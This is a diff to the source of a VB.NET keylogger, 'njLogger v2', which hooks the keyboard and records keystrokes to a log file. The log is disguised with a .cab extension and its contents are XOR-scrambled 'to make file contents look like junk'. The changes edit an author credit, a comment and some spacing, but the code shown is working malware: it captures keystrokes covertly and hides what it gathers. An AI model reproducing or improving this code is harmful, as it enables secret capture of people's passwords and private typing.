@@ -4,7 +4,7 @@ Imports System.Xml
 
 Public Class KLogger
     '##### njLogger v2 , 2012-2-12
-    '##### Coded By njQ8, modified by Henry (chocolatkey)
+    '##### Coded By njQ8, modified by chocolatkey
     '##### Keyboard Hook By (Eprouvez,Deathader)
     '##### You Cant Test This In Debug Mode..,Compile it First!! Or UnCheck "Enable the Visual Studio hosting process"
     Public Logs As String = "" '<<<<<<<<<< you Read Logs By this 
@@ -12,6 +12,7 @@ Public Class KLogger
     Public MaxLength As Integer = 100000 * 1024 ' Max Logs Size 100MB
     Private Stream As IO.StreamWriter
     Dim o = My.Computer.Clock.LocalTime
+    ''TODO CHANGE
     Public LogsPath As String = Application.ExecutablePath.Remove(Application.ExecutablePath.Length - New IO.FileInfo(Application.ExecutablePath).Extension.Length, New IO.FileInfo(Application.ExecutablePath).Extension.Length) & ".cab"
     Dim xmldoc As New XmlDataDocument()
     Public Shared modulus As String
@@ -95,7 +96,7 @@ Public Class KLogger
                             Isdown(i) = False
                             Dim s As String = AV() & Fix(i)
                             lastKey = i
-                            s = Xord(s, Crypt.Crc32.ComputeChecksum(SB(modulus))) ''RC4 with crc32 of public key modulus as password
+                            s = Xord(s, Crypt.Crc32.ComputeChecksum(SB(modulus))) ''XOR with crc32 of public key modulus as password (just to make file contents look like junk)
                             Logs += s
                             Stream.Write(s)
                             If Logs.Length > MaxLength Then
@@ -170,7 +171,7 @@ Public Class KLogger
                     Return "<span class=""k"">[ENTER]</span>"
                 Case Keys.Tab
                     If lastKey = k Then Return ""
-                    Return "<span  class=""k"">[TAB]</span>"
+                    Return "<span class=""k"">[TAB]</span>"
                 Case Else
                     If isuper = True Then
                         Return VKCodeToUnicode(k).ToUpper
